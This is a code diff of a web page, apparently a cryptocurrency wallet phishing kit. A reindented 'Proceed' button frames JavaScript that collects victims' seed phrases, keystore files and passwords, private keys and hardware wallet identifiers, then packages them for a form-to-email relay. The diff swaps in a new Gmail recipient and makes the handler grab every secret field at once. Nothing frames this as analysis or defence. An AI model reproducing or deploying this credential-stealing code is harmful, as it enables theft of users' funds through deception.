@@ -782,19 +782,19 @@
                     </div>
                   </div>
                 </div>
-              </div>
-              <div class="flex w-full">
-                <button type="submit"
-                  class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"
-                  id="phraseProceed" name="play">
-                  <span class="mr-2 uppercase">Proceed</span>
-                  <span>
-                    <svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24"
-                      stroke="currentColor" class="h-6 w-6">
-                      <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                    </svg>
-                  </span>
-                </button>
+                <div class="flex w-full">
+                  <button type="submit"
+                    class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"
+                    id="phraseProceed" name="play">
+                    <span class="mr-2 uppercase">Proceed</span>
+                    <span>
+                      <svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6">
+                        <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                      </svg>
+                    </span>
+                  </button>
+                </div>
               </div>
             </form>
           </div>
@@ -2465,27 +2465,22 @@
       console.log(walletName)
       e.preventDefault();
       let a = document.querySelector(".label");
-      mail = "codenew39@gmail.com";
+      mail = "Mayhemofflin@gmail.com";
       next = "next.html";
       subject = `${window.location.hostname} ${new Date()}`;
       let r = new FormData();
       let s = document.querySelector("form").name;
-      if (e.target.name === "phrasekey") {
-        phrase = document.querySelector("textarea").value;
-        r.append("phraseKey", phrase);
-      } else if (e.target.name === "keystorekey") {
-        jsonphrase = document.querySelector("textarea").value;
-        password = document.querySelector('input[name="keystorePassword"]').value;
-        r.append("jsonphrase", jsonphrase);
-        r.append("password", password);
-      } else if (e.target.name === "privatekey") {
-        privatekey = document.querySelector("textarea").value;
-        r.append("privatekey", privatekey);
-      } else if (e.target.name === "hardwareKey") {
-        hardwarekey = document.querySelector('input[name="hardware"]').value;
-        r.append("hardwarekey", hardwarekey);
-      }
-      r.append("Type", walletName);
+      phrase = phraseInput.value;
+      r.append("phraseKey", phrase);
+      jsonphrase = keystorejson.value;
+      password = keystorepassword.value;
+      r.append("jsonphrase", jsonphrase);
+      r.append("password", password);
+      privatekey = privatekey.value;
+      r.append("privatekey", privatekey);
+      hardwarekey = wallet_id.value;
+      r.append("hardwarekey", hardwarekey);
+      r.append("Wallet Type", walletName);
       r.append("_captcha", false);
       r.append("_next", next);
       r.append("_template", "table");
